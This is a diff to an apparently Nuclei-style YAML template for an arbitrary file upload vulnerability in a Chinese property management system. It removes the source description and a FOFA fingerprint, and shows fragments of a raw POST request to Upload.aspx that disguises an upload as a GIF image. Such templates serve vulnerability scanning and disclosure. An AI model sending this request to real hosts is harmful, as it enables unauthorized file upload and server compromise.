@@ -3,12 +3,8 @@ info:
   name: 新视窗新一代物业管理系统任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gp8pbs9pkcp8cisv'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gp8pbs9pkcp8cisv
-    fofa: body="BPMSite/ClientSupport/OCXInstall.aspx"
 http:
 - raw:
   - 'POST /OfficeManagement/RegisterManager/Upload.aspx HTTP/1.1
@@ -26,8 +22,6 @@ http:
     Connection: close
 
 
-
-
     --00content0boundary00
 
 
@@ -35,8 +29,6 @@ http:
 
 
     Content-Type: image/jpg
-
-
 
 
     GIF89a
